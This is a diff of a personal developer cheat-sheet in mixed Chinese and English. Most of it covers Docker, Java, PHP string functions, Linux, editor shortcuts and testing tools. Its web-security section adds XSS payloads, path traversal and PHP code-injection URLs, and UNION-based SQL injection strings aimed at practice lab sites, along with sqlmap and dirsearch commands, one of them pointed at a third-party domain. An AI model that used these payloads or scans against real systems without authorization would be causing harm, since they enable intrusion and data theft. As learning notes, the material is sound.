@@ -854,6 +854,7 @@ date: 2019-05-13 14:42:09
       - `docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined` 解决gdb不能run问题
     - `docker exec -it <container id> bash`
       - `exit`
+      - `docker exec -it <container id> nginx reload`
     - `docker logs`
     - `docker cp ./a.txt <container id>:/root/`
     - `docker commit <container id> <a name for new image>`
@@ -913,6 +914,7 @@ date: 2019-05-13 14:42:09
     - jprof
     - jconsole
     - jmap
+      - `jmap -dump:file=./adump.data <pid>` memory dump
     - jstat
     - jcmd
     - jvisualVM
@@ -920,7 +922,7 @@ date: 2019-05-13 14:42:09
       - jmx client
       - jmx bean, program
     - jdb
-    - jps查看java进程
+    - jps查看java进程 和 ps获取的是一样的
   - class加载
     - class结构
       - Magic 0xCAFEBABE
@@ -1008,16 +1010,6 @@ date: 2019-05-13 14:42:09
       - 注册channel到selector接收方
       - 轮询写事件开线程处理 任务队列
   - AIO(NIO2) 直接实现从kernel copy到user
-- test
-  - mockito
-    - 实现原理
-  - powermock
-  - TestNG
-    - group
-      - `@Test(groups = { "functest", "checkintest" })`
-        - 方法上
-        - 类上
-      - testng.xml
 - 热部署
   - JRebel
 - IDE
@@ -1091,6 +1083,7 @@ date: 2019-05-13 14:42:09
   - `exit()`
 
 # PHP
+- [online editor](https://www.jdoodle.com/php-online-editor/)
 - require vs include: require 没有会报错
 - [String](https://www.php.net/manual/zh/language.types.string.php)
   - 单引号
@@ -1154,9 +1147,25 @@ date: 2019-05-13 14:42:09
     ?>
     ```
   - 拼接用., +没用
+    - `echo "1) ".var_export(substr("pear", 0, 2), true).PHP_EOL;`
   - [字符串函数](https://www.php.net/manual/zh/ref.strings.php)
-    - substr ( string $string , int $start [, int $length ] ) : string
-      - [doc](https://www.php.net/manual/zh/function.substr.php)
+    - [substr](https://www.php.net/manual/zh/function.substr.php)
+      - `substr( string $string , int $start [, int $length ] ) : string`
+      - `echo substr('abcdef', 1, 3);` bcd
+      - `echo substr('abcdef', -1, 1); ` f
+    - [str_replace](https://www.php.net/manual/en/function.str-replace.php)
+      - `$str = str_replace("ll", "", "good golly miss molly!", $count);` 把"good golly miss molly!"里的"ll"换成""
+    - [str_contains](https://www.php.net/manual/en/function.str-contains.php)
+      - `str_contains ( string $haystack , string $needle ) : bool`
+      - `str_contains($string, 'lazy')`
+    - [str_starts_with](https://www.php.net/manual/en/function.str-starts-with.php)
+      - `str_starts_with($string, 'The')`
+    - [str_split](https://www.php.net/manual/en/function.str-split.php)
+      - `$arr1 = str_split($str);` 按空格分
+    - [strcmp](https://www.php.net/manual/en/function.strcmp.php)
+      - `if (strcmp($var1, $var2) !== 0) {    echo '$var1 is not equal to $var2 in a case sensitive string comparison';}`
+      - strncmp: compare first n
+      - strcasecmp: case insensitive
 
 # Spring
 - Core
@@ -1545,6 +1554,7 @@ date: 2019-05-13 14:42:09
       - Apache kafka实战.pdf
     - [源码](https://github.com/apache/kafka)
 - [Nginx](https://www.nginx.com/)
+  - `nginx reload`
 - [Zookeeper](https://zookeeper.apache.org/releases.html)
   - 启动
     - `./zookeeper-server-start.sh ../config/zookeeper.properties`
@@ -1641,13 +1651,16 @@ date: 2019-05-13 14:42:09
         - [john the ripper](https://www.openwall.com/john/)
           - `zip2john <zip_file> > <password_file>`
         - cewl 收集字典
-          -  `cewl https://www.hbo.com/game-of-thrones -w gameOfThrone.txt -d 3`
+          - `cewl https://www.hbo.com/game-of-thrones -w gameOfThrone.txt -d 3`
 
   - Key
     - PBKDF1/PBKDF2 (Password-Based Key Derivation Function)
+  - 攻击
+    - [彩虹表](https://zh.wikipedia.org/wiki/%E5%BD%A9%E8%99%B9%E8%A1%A8)
 - 编码
   - [ascii](https://www.systutorials.com/f/2013/ascii.txt)
   - Base64
+    - `echo "U2VjcmV0IG1lc3NhZ2U=" | base64 -d`
   - Base32
   - Base16
   - 培根密码，AB表01替换字母
@@ -1693,19 +1706,38 @@ date: 2019-05-13 14:42:09
   - [web-hacking-101](https://wizardforcel.gitbooks.io/web-hacking-101/content/)
     - name server `nslookup www.baidu.com`
     - [412 precondition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/412)
-    - 攻击
+    - 攻击+工具
       - [csrf 攻击](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
       - xss
-      - phishing 偷 cookie
-      - phishing 偷 token
-    - tools
-      - [subdomain scan](https://subdomainfinder.c99.nl/index.php)
-      - [Phishing 查询被调参数神站](https://postb.in/)
-      - path scan
-        - [dirsearch](https://github.com/maurosoria/dirsearch)
-          - `~/opt/anaconda3/bin/python dirsearch.py -e php,txt,gitignore,Dockerfile -u https://robokracy.com`
-      - port scan
-        - [nmap](https://nmap.org/download.html)
+        - phishing 偷 cookie
+          - [Phishing 查询被调参数神站](https://postb.in/)
+        - phishing 偷 token
+        - example
+          - `<script>alert(1)</script>`
+          - `<img src=x onerror='alert(1)'>`
+          - `<IMG onmouseover="alert(1)">alert(2)</img>`
+            - when it replaces img with blocked
+          - artists,carts,categ,featured,guestbook,pictures,products,users
+
+      - Brute Force
+      - Path traversal
+        - path scan
+          - [dirsearch](https://github.com/maurosoria/dirsearch)
+            - `~/opt/anaconda3/bin/python dirsearch.py -e php,txt,gitignore,Dockerfile -u https://robokracy.com`
+        - port scan
+          - [nmap](https://nmap.org/download.html)
+        - example
+          - https://google-gruyere.appspot.com/542456601471262836313354380787402066011/a/..%2f..%2fsecret.txt
+            - %2f is /
+
+      - DoS
+      - DNS spoofing
+        - [subdomain scan](https://subdomainfinder.c99.nl/index.php)
+      - Man in the middle
+        - [mitm proxy](https://mitmproxy.org/)
+          - 可以用来做Single User Performance Test
+      - Parameter tampering
+        - 直接在POST payload里或者GET ?后加可能的parameter
       - 抓包工具
         - [wireshark](https://www.wireshark.org/download.html)
           - [从http数据包获取用户登陆信息](https://blog.csdn.net/wangqingchuan92/article/details/81095871)
@@ -1754,6 +1786,12 @@ date: 2019-05-13 14:42:09
           - 这个最重要`./d2j-dex2jar.sh classes.dex`
         - [jd-gui](http://java-decompiler.github.io/)
           - 这个也无所谓，直接找随便一个项目，idea导入为lib，就能看见源代码了
+  - Python
+    - python 沙箱逃逸
+  - PHP
+    - eval
+      - `https://bugacademy.xsec.sap.corp/web/code_injection/1.php?cmd=echo%28file_get_contents%28%271bflag.txt%27%29%29%3B&level=1`
+
   - sql injection
     - [sqlmap](http://sqlmap.org/)
       - `~/opt/anaconda3/bin/python sqlmap.py -u http://robokracy.com:18443/admin.php --batch --banner`
@@ -1765,6 +1803,17 @@ date: 2019-05-13 14:42:09
     - `admin or 1=1)--`
     - `" or ""="`
     - `105; DROP TABLE Suppliers`
+    - `http://testphp.vulnweb.com/artists.php?artist=1'`
+    - `http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()`
+    - `http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27`
+    - xpath injection
+      - php:`$results = $xml->xpath("/bookstore/book[title='".$_GET['search']."']");`
+        - `1' or'1'='1`
+    - python 防注入
+      ```python
+      cursor.execute("insert into people values (?, ?)", (who, age))
+      ```
+    - php 防注入
   - nosql injection
     - `username[$ne]=help&password[$ne]=help&login=login`
   - 图片
@@ -1772,18 +1821,40 @@ date: 2019-05-13 14:42:09
       - 文件meta
       - [StegSolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)
     - jpg
-      - FFD8~FFD9
+      - `FFD8` to `FFD9`
         - copy命令
     - png
       - 改高度
     - 小色差
   - xml攻击
   - reverse shell
+- test and defend
   - pentest
     - tools
       - ZAP
         - active scan
         - passive scan
+  - fire wall
+  - ip white list
+  - code scan
+    - fortify
+    - white source
+
+- Fun & News
+  - [The Hacker News](https://thehackernews.com/)
+  - 不联网的机器如何爆破
+    - Air-Fi 内存读写导致总线能发出2.4G类似Wifi的信号
+    - 屏幕以人眼不能分辨的频率闪动
+    - 电风扇声音
+    - 物理入侵
+  - Social Engineering
+    - 尾随
+    - 钓鱼邮件
+    - 查看他的社交软件
+    - 套话
+
+
+
 
 # Linux
 - shell
@@ -1798,10 +1869,16 @@ date: 2019-05-13 14:42:09
   - 网络
     - `lsof -i :12345` list open files with port 12345
     - `ifconfig|grep inet` 获取本机ip
+    - `scp -p -P 29418 xxx@Gerrit.xx.com.cn:hooks/commit-msg YourProject/.git/hooks/` secure copy -preserve modification times, access times, and modes from the original file with Port 29418 from xxx@Gerrit.xx.com.cn:hooks/commit-msg to YourProject/.git/hooks/
+    - `ssh catchit@10.55.128.223 -i ssh-key`
   - 线程
     - `kill -9 <pid>`
+    - `ps`
   - `uname -a`  查看操作系统信息
   - `file <file>` 查看这是啥文件
+  - 性能监控
+    - `top`
+    - `htop`
   - txt处理
     - `cat a.txt|sort|uniq` 排序，去重
     - awk
@@ -1812,6 +1889,12 @@ date: 2019-05-13 14:42:09
         - `awk '{ print $1}' system-access.log.txt | sort | uniq -c | sort -nr | head -n 10`
     - sort
       - `sort --field-separator='\t' --key=2,1`
+- 配置
+  - `/etc/profile`
+  - `~/.bashrc`
+  - `~/.config/nvim`
+  - `~/.config/htop/htoprc`
+
 - 安装
   - `apt-get install binutils`
     - objdump
@@ -1857,8 +1940,8 @@ date: 2019-05-13 14:42:09
 - 快捷键
   - Command + Tab 切app
   - lock screen = Command + Ctrl + Q
-  - Ctrl+B+Down 同app下窗口缩略
-  - Ctrl+B+Up 所有窗口缩略
+  - Ctrl+Down 同app下窗口缩略
+  - Ctrl+Up 所有窗口缩略
   - Ctrl+Left/Right: 切桌面
   - Command+Left/Right: 切窗口
   - Command+W: 关窗口
@@ -1877,6 +1960,14 @@ date: 2019-05-13 14:42:09
 
 - intellij idea
   - jump to line = Command + L
+  - PlantUML
+    - brew install graphviz
+  - debug
+    - Ctrl+alt+D
+  - breakpoints
+    - command+F8
+  - watch: Alt+F8
+  - 切tab ctrl+tab
 - quick time
   - 用option+J慢放 或者option+L快放，就是从1.1倍开始了,1.9倍有声音，2倍没有声音
 - [Alfred](https://www.alfredapp.com/)
@@ -1891,9 +1982,14 @@ date: 2019-05-13 14:42:09
 - autojump
   - `brew install autojump`
   - `j <dirName>`
+
+- [iTerm2](https://iterm2.com/downloads.html)
+  - [cheat sheet](https://gist.github.com/squarism/ae3613daf5c01a98ba3a)
+  - [readline cheatsheet](https://readline.kablamo.org/emacs.html)
 - terminal 分屏复用
   - [tmux](https://github.com/tmux/tmux/wiki)
     - `brew install tmux`
+    - `vi ~/.tmux.conf`
     - [dyld: Library not loaded: /usr/local/opt/libevent/lib/libevent-2.1.6.dylib](https://blog.csdn.net/arkzheng/article/details/79576652)
     - Sessions
       - Ctrl + b s: list all sessions
@@ -1925,6 +2021,10 @@ date: 2019-05-13 14:42:09
       - Ctrl + b Alt + o: 所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。
     - Help
       - Ctrl + b ?
+    - Scroll
+      - Ctrl ＋ｂ + [
+      - 滚轮/Page up/Page down
+      - q
 - neovim
   - `brew install neovim`
   - ~/.config/nvim/init.vim
@@ -1933,6 +2033,8 @@ date: 2019-05-13 14:42:09
     - shift + "#"  向上查找并高亮显示
     - "g" + "d"    高亮显示光标所属单词，"n" 查找！
   - ctrl-v 列编辑模式
+- Chrome
+  - 切tab cmd+alt+arrow
 
 # Windows
 - 查看pid `wmic process get name, processid|findstr 27284`
@@ -1945,3 +2047,30 @@ date: 2019-05-13 14:42:09
     - Ctrl+K+K 从光标处开始删除代码至行尾。
     - Ctrl+Shift+← 向左单位性地选中文本。
     - Ctrl+Shift+→ 向右单位性地选中文本。
+- Chrome
+  - vimium
+    - hjkl esc
+    - f F for link
+    - r for refresh
+    - cmd+L for foucus on url
+- postman
+  - [快捷键](https://www.cnblogs.com/qican/p/11699732.html)
+# Tools
+- [正则可视化](https://jex.im/regulex/)
+-
+
+# Test
+- UT
+  - mockito
+    - 实现原理
+  - powermock
+  - TestNG
+    - group
+      - `@Test(groups = { "functest", "checkintest" })`
+        - 方法上
+        - 类上
+      - testng.xml
+  - jmockit
+- IT
+  - [JMeter](https://jmeter.apache.org/download_jmeter.cgi)
+- Performance Test
